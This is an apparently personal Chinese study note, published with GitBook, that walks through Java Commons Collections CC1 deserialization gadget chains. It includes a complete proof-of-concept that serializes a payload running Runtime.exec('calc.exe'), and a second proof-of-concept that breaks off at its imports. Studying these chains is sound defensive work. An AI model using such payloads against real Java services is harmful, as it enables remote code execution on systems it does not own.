
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>CommonsCollections逐步分析 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../styles/website.css">
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="../" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.2" data-path="CommonsCollections逐步分析.html">
            
                <a href="CommonsCollections逐步分析.html">
            
                    
                    CommonsCollections逐步分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <a target="_blank" href="https://github.com/AmTrain-Ricky/amtrain-ricky.github.io/tree/main/javanote">
            
                    
                    fastjson逐步分析(PDF)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="Java XML反序列化漏洞.html">
            
                <a href="Java XML反序列化漏洞.html">
            
                    
                    Java XML反序列化漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="ROME逐步分析.html">
            
                <a href="ROME逐步分析.html">
            
                    
                    ROME逐步分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="javatest.html">
            
                <a href="javatest.html">
            
                    
                    Java相关题型复现
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >CommonsCollections逐步分析</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="commonscollections&#x9010;&#x6B65;&#x5206;&#x6790;">CommonsCollections&#x9010;&#x6B65;&#x5206;&#x6790;</h1>
<p>&#x4ECE;&#x96F6;&#x5F00;&#x59CB;&#x8BB0;&#x5F55;CC&#x94FE;&#x7684;&#x6784;&#x9020;</p>
<p><img src="img/CommonsCollections.png" alt="CommonsCollections"></p>
<h2 id="&#x5BF9;&#x4E8E;-invokertransformer-&#x7684;&#x7406;&#x89E3;">&#x5BF9;&#x4E8E; InvokerTransformer &#x7684;&#x7406;&#x89E3;</h2>
<p>&#x53C2;&#x8003;: </p>
<ol>
<li><a href="https://xz.aliyun.com/t/7031#toc-4" target="_blank">https://xz.aliyun.com/t/7031#toc-4</a></li>
<li><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank">https://xz.aliyun.com/t/4711#toc-3</a></li>
<li><a href="https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ" target="_blank">https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ</a></li>
</ol>
<p>&#x4EE5; Transformer[] &#x4F5C;&#x4E3A;&#x63A5;&#x53E3;&#x7684;&#x7C7B;, Transformer &#x5B9A;&#x4E49;&#x4E86; transform &#x65B9;&#x6CD5;</p>
<pre><code>public Object transform(Object input)

public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)

public ChainedTransformer(Transformer[] transformers)
</code></pre><p>&#x770B;&#x5230; InvokerTransformer &#x4E2D;&#x7684; transform &#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>{
        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">try</span> {
                Class cls = input.getClass();
                Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);
                <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs);
            } <span class="hljs-keyword">catch</span> (NoSuchMethodException var5) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; does not exist&quot;</span>);
            } <span class="hljs-keyword">catch</span> (IllegalAccessException var6) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; cannot be accessed&quot;</span>);
            } <span class="hljs-keyword">catch</span> (InvocationTargetException var7) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; threw an exception&quot;</span>, var7);
            }
        }
    }
</code></pre>
<p>&#x6CE8;&#x610F;&#x5230;<code>input.getClass()</code>&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x4E0A;&#x7684;&#x4E00;&#x4E9B;&#x533A;&#x522B;&#xFF1A;</p>
<ul>
<li>&#x5F53;input&#x662F;&#x4E00;&#x4E2A;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x65F6;&#xFF0C;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x7C7B;</li>
<li>&#x5F53;input&#x662F;&#x4E00;&#x4E2A;&#x7C7B;&#x65F6;&#xFF0C;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x662F;java.lang.Class</li>
</ul>
<p>&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x7528; Runtime.class &#x53BB;&#x51ED;&#x7A7A;&#x5F97;&#x5230; Runtime &#x7C7B;&#x4ECE;&#x800C;&#x627E;&#x5230; exec, &#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x8C03;&#x7528;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x83B7;&#x53D6;&#x5230; getRuntime &#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    Object a = Runtime.getRuntime();
    Class b = Runtime.class;
    System.out.println(a.getClass());<span class="hljs-comment">//class java.lang.Runtime</span>
    System.out.println(b.getClass());<span class="hljs-comment">//class java.lang.Class</span>
</code></pre>
<p>&#x6211;&#x4EEC;&#x7684;&#x6700;&#x7EC8;&#x76EE;&#x7684;&#x662F;&#x6267;&#x884C;
<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p>
<p>&#x53CD;&#x5C04;&#x4E2D;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6CD5;</p>
<pre><code>@CallerSensitive public Method getMethod(String paramString, Class&lt;?&gt;... paramVarArgs)

public Object invoke(Object paramObject, Object... paramVarArgs)

public Process exec(String command)
</code></pre><p>&#x5148;&#x6765;&#x83B7;&#x53D6;getRuntime&#x7C7B;</p>
<pre><code>//&#x76EE;&#x6807;&#x8BED;&#x53E5;
Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;)
//&#x4F7F;&#x7528;java.lang.Class&#x5F00;&#x5934;
Class.forName(&quot;java.lang.Class&quot;).getMethod(&quot;getMethod&quot;, new Class[] {String.class, Class[].class })
        .invoke(Class.forName(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,new Class[0]);
        //invoke&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;Runtime&#x7C7B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;Runtime&#x7C7B;&#x4E2D;&#x53BB;&#x6267;&#x884C;getMethod&#xFF0C;&#x83B7;&#x53D6;getRuntime&#x53C2;&#x6570;
</code></pre><p>&#x5BF9;&#x7167;&#x7740;InvokerTransformer&#x7C7B;&#x8F6C;&#x53D8;&#x4E3A;transformers&#x683C;&#x5F0F;</p>
<pre><code>Class cls = input.getClass();//cls = java.lang.Class
Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod&#x65B9;&#x6CD5;
return method.invoke(input, this.iArgs); //&#x5728;Runtime&#x4E2D;&#x627E;getRuntime&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
       //&#x8FD8;&#x9700;&#x8981;&#x586B;&#x5145; &#x8C03;&#x7528;getRuntime&#x5F97;&#x5230;Runtime&#x5B9E;&#x4F8B;,
        new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[] {&quot;calc.exe&quot;})
};
</code></pre><p>&#x8FD8;&#x5DEE;&#x6267;&#x884C;&#x83B7;&#x53D6;&#x5230;&#x7684;getRuntime&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;input&#x662F;&#x4E0A;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x63A5;&#x53E3;&#xFF0C;&#x7EE7;&#x7EED;&#x5BF9;&#x7167;</p>
<pre><code>//input=getRuntime&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;
Class cls = input.getClass();//cls = java.lang.Method&#xFF08;getRuntime&#x65B9;&#x6CD5;&#x662F;method&#x7C7B;&#xFF09;
Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //&#x5728;method&#x7C7B;&#x4E2D;&#x627E;&#x5230;invoke&#x65B9;&#x6CD5;&#xFF0C;method=invoke&#x65B9;&#x6CD5;
return method.invoke(input, this.iArgs); //&#x8C03;&#x7528;invoke&#x65B9;&#x6CD5;&#xFF0C;input=getRuntime&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x4F20;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x53C2;&#x6570;
</code></pre><p>&#x4EE5;&#x4E0A;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x6709;&#x70B9;&#x590D;&#x6742;&#xFF0C;method&#x5C31;&#x662F;invoke&#x65B9;&#x6CD5;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4F7F;&#x7528;invoke&#x8C03;&#x7528;&#x4E86;invoke&#x51FD;&#x6570;&#x3002;
&#x9996;&#x5148;this.iMethodName, this.iParamTypes&#x662F;&#x6839;&#x636E;invoke&#x63A5;&#x53E3;&#x800C;&#x5B9A;&#x7684;&#xFF1A;</p>
<pre><code>public Object invoke(Object obj, Object... args)
//this.iMethodName=&quot;invoke&quot;
//this.iParamTypes=new Class[] {Object.class, Object[].class }
//&#x5916;&#x9762;class&#x3001;Object&#x5C01;&#x88C5;&#x662F;InvokerTransformer&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x8981;&#x6C42;
</code></pre><p>&#x6309;&#x7167;invoke&#x4E2D;&#x7684;input&#x624D;&#x662F;&#x5B83;&#x8981;&#x8C03;&#x7528;&#x7684;&#x73AF;&#x5883;&#x7684;&#x51C6;&#x5219;&#x3002;
<code>invoke&#x65B9;&#x6CD5;.invoke(input, this.iArgs)</code>&#x5B9E;&#x9645;&#x4E0A;&#x7B49;&#x4E8E;<code>input.invoke(this.iArgs)</code>&#xFF0C;
&#x800C;input=getRuntime&#x65B9;&#x6CD5;&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x586B;&#x5165;<code>this.iArgs</code>&#x5C31;&#x597D;&#x4E86;</p>
<p>&#x53C8;&#x7531;&#x4E8E;getRuntime&#x662F;&#x4E2A;&#x9759;&#x6001;&#x51FD;&#x6570;&#xFF0C;&#x4E0D;&#x7528;&#x592A;&#x7EA0;&#x7ED3;&#x8F93;&#x5165;obj&#xFF0C;&#x5199;&#x4F5C;null&#x3002;getRuntime&#x65B9;&#x6CD5;&#x4E0D;&#x9700;&#x8981;&#x53C2;&#x6570;&#x3002;
<code>this.iArgs=null,new Object[0]</code></p>
<p>&#x6574;&#x5408;&#x5982;&#x4E0B;:</p>
<pre><code>Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
            new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;}),
        };
</code></pre><h2 id="cc1transformedmap">CC1_TransformedMap</h2>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;3.1-3.2.1&#xFF0C;jdk1.8&#x4EE5;&#x524D; </p>
<h3 id="&#x5173;&#x4E8E;&#x7C7B;-annotationinvocationhandler-&#x4E2D;-thistype-&#x8D4B;&#x503C;&#x95EE;&#x9898;">&#x5173;&#x4E8E;&#x7C7B; <strong>AnnotationInvocationHandler</strong> &#x4E2D; <strong>this.type</strong> &#x8D4B;&#x503C;&#x95EE;&#x9898;</h3>
<blockquote>
<p>&#x7F51;&#x7EDC;&#x4E0A;&#x5F88;&#x591A;&#x5206;&#x6790;&#x6587;&#x7AE0;&#x5C06; <strong>this.type</strong> &#x8BBE;&#x7F6E;&#x6210; <strong>java.lang.annotation.Retention.class</strong> &#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x8BF4;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E2A;&#x7C7B;&#x53EF;&#x4EE5;&#x3002;&#x800C;&#x5728;&#x8C03;&#x8BD5;&#x4EE3;&#x7801;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6211;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x548C;&#x6CE8;&#x89E3;&#x7C7B;&#x4E2D;&#x6709;&#x65E0;&#x5B9A;&#x4E49;&#x65B9;&#x6CD5;&#x6709;&#x5173;&#x3002;&#x53EA;&#x6709;&#x5B9A;&#x4E49;&#x4E86;&#x65B9;&#x6CD5;&#x7684;&#x6CE8;&#x89E3;&#x624D;&#x80FD;&#x89E6;&#x53D1; <strong>POC</strong> &#x3002;&#x4F8B;&#x5982; <strong>java.lang.annotation.Retention&#x3001;java.lang.annotation.Target</strong> &#x90FD;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#xFF0C;&#x800C; <strong>java.lang.annotation.Documented</strong> &#x5219;&#x4E0D;&#x884C;&#x3002;&#x800C;&#x4E14;&#x6211;&#x4EEC; <strong>POC</strong> &#x4E2D;&#xFF0C; <strong>innermap</strong> &#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x952E;&#x540D;&#x4E0E;&#x6CE8;&#x89E3;&#x7C7B;&#x65B9;&#x6CD5;&#x540D;&#x4E00;&#x6837;&#x7684;&#x5143;&#x7D20;&#x3002;&#x800C;&#x6CE8;&#x89E3;&#x7C7B;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7C7B;&#x578B;&#x5C06;&#x662F; <strong>clazz</strong> &#x7684;&#x503C;&#x3002; </p>
</blockquote>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.annotation.Retention;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1_TransformedMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-comment">//1. &#x5BA2;&#x6237;&#x7AEF;&#x6784;&#x5EFA;&#x653B;&#x51FB;&#x4EE3;&#x7801;</span>
        <span class="hljs-comment">//&#x6B64;&#x5904;&#x6784;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;transformers&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x5728;&#x5176;&#x4E2D;&#x6784;&#x5EFA;&#x4E86;&#x4EFB;&#x610F;&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#x6838;&#x5FC3;&#x4EE3;&#x7801;</span>
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-comment">//&#x9690;&#x853D;&#x4E86;&#x542F;&#x52A8;&#x8FDB;&#x7A0B;&#x7684;&#x65E5;&#x5FD7;&#x7279;&#x5F81;</span>
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        <span class="hljs-comment">//&#x5C06;transformers&#x6570;&#x7EC4;&#x5B58;&#x5165;ChaniedTransformer&#x8FD9;&#x4E2A;&#x7EE7;&#x627F;&#x7C7B;</span>
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        <span class="hljs-comment">//&#x521B;&#x5EFA;Map&#x5E76;&#x7ED1;&#x5B9A;chainedTransformer</span>
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;key&quot;</span>);
        <span class="hljs-comment">//&#x7ED9;&#x4E88;Map&#x6570;&#x636E;&#x8F6C;&#x5316;&#x94FE;</span>
        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, chainedTransformer);
        <span class="hljs-comment">//&#x5728;jdk1.7&#x4E2D;&#x5C31;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5B8C;&#x7F8E;&#x7684;readobject&#x590D;&#x5199;&#x70B9;&#x7684;&#x7C7B;sun.reflect.annotation.AnnotationInvocationHandler</span>
        <span class="hljs-comment">//&#x53CD;&#x5C04;&#x673A;&#x5236;&#x8C03;&#x7528;AnnotationInvocationHandler&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;</span>
        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        <span class="hljs-comment">//&#x53D6;&#x6D88;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4FEE;&#x9970;&#x7B26;&#x9650;&#x5236;</span>
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);
        <span class="hljs-comment">//&#x83B7;&#x53D6;AnnotationInvocationHandler&#x7C7B;&#x5B9E;&#x4F8B; Target, Retention (&#x63A5;&#x53E3;&#x4E2D;&#x6709;value&#x65B9;&#x6CD5;&#x89C4;&#x5219;&#x5F71;&#x54CD;var4&#x7684;&#x8D4B;&#x503C;)</span>
<span class="hljs-comment">//        Object cc1 = constructor.newInstance(Target.class, outerMap);</span>
        Object cc1 = constructor.newInstance(Retention.class, outerMap);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(cc1);
        oos.close();
        System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

        <span class="hljs-comment">// &#x5199;&#x6587;&#x4EF6;&#x5199;&#x6CD5;</span>
        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(cc1);
        objectOutputStream.flush();
        objectOutputStream.close();
        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);
        objectInputStream.readObject();

        <span class="hljs-comment">// Map&#x8F6C;&#x6362;&#x94FE;&#x89E6;&#x53D1;&#x6D4B;&#x8BD5;</span>
<span class="hljs-comment">//        FileOutputStream fileOutputStream = new FileOutputStream(&quot;payload.bin&quot;);</span>
<span class="hljs-comment">//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);</span>
<span class="hljs-comment">//        objectOutputStream.writeObject(outerMap);</span>
<span class="hljs-comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;payload.bin&quot;);</span>
<span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);</span>
<span class="hljs-comment">//        Map outerMap_now = (Map) objectInputStream.readObject();</span>
        <span class="hljs-comment">//2.1 &#x53EF;&#x4EE5;&#x76F4;&#x63A5;map&#x6DFB;&#x52A0;&#x65B0;&#x503C;&#xFF0C;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;</span>
<span class="hljs-comment">//        outerMap_now.put(&quot;ricky&quot;, &quot;test&quot;);</span>
        <span class="hljs-comment">//2.2 &#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;map&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x4FEE;&#x6539;value&#xFF0C;value&#x4E3A;value&#xFF0C;foobar,&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;</span>
<span class="hljs-comment">//        Map.Entry onlyElement = (Map.Entry)outerMap_now.entrySet().iterator().next();</span>
<span class="hljs-comment">//        onlyElement.setValue(&quot;ricky&quot;);</span>
    }
}
</code></pre>
<h2 id="cc1lazymap">CC1_LazyMap</h2>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;3.1-3.2.1&#xFF0C;jdk1.8&#x4EE5;&#x524D; </p>
<p>LazyMap&#x8C03;&#x7528;</p>
<pre><code>public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}

protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
    throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
    }
    this.factory = factory;
}

public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        //&#x6B64;&#x5904;&#x89E6;&#x53D1;transform&#x65B9;&#x6CD5;
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
</code></pre><h3 id="proxy&#x52A8;&#x6001;&#x4EE3;&#x7406;">Proxy&#x52A8;&#x6001;&#x4EE3;&#x7406;</h3>
<pre><code>{@code InvocationHandler} is the interface implemented by
the &lt;i&gt;invocation handler&lt;/i&gt; of a proxy instance.

&lt;p&gt;Each proxy instance has an associated invocation handler.
When a method is invoked on a proxy instance, the method
invocation is encoded and dispatched to the {@code invoke}
method of its invocation handler.
</code></pre><blockquote>
<p>&#x6BCF;&#x4E00;&#x4E2A;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x7C7B;&#x7684;&#x8C03;&#x7528;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x90FD;&#x5FC5;&#x987B;&#x5B9E;&#x73B0;InvocationHandler&#x63A5;&#x53E3;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x4E2A;&#x4EE3;&#x7406;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x90FD;&#x5173;&#x8054;&#x5230;&#x4E86;&#x5B9E;&#x73B0;&#x8BE5;&#x63A5;&#x53E3;&#x7684;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x7C7B;&#x8C03;&#x7528;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x8C03;&#x7528;&#x5C31;&#x4F1A;&#x88AB;&#x8F6C;&#x53D1;&#x5230;&#x5B9E;&#x73B0;InvocationHandler&#x63A5;&#x53E3;&#x7C7B;&#x7684;invoke&#x65B9;&#x6CD5;&#x6765;&#x8C03;&#x7528; </p>
</blockquote>
<p>&#x5B9A;&#x4E49;&#x65B9;&#x5F0F;</p>
<pre><code>public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.annotation.Retention;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
